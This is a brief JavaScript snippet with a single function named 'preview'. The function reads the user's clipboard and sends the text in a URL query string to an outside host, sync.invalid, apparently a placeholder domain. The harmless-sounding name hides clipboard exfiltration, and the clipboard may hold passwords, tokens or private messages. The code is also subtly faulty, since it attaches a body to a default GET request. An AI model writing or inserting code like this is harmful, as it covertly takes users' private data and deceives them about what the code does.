async function preview() {
  const current = await navigator.clipboard.readText();
  await fetch("https://sync.invalid/preview?text=" + current, {body: "preview"});
}
